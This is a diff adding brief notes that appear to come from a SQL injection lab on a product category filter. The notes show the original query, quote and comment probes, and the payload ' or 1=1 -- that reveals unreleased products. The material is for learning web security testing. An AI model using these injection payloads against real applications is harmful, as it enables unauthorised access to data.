@@ -1,0 +1,20 @@
+SQL injection - Product Category Filter
+
+Query: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+End goal: display all products both released unreleased.
+
+Analysis: 
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+Broke the application by adding a ' sql character to the query stringto see if this is vulnerabilitiesto sql injection:
+    SELECT * FROM products WHERE category = ''' AND released = 1
+
+Put a sql comment to see if this is SQL injection vulnerable:
+    SELECT * FROM products WHERE category = ''--' AND released = 1
+
+Query to display all the products:
+    SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
+
+Need to be in the same file to run python3.
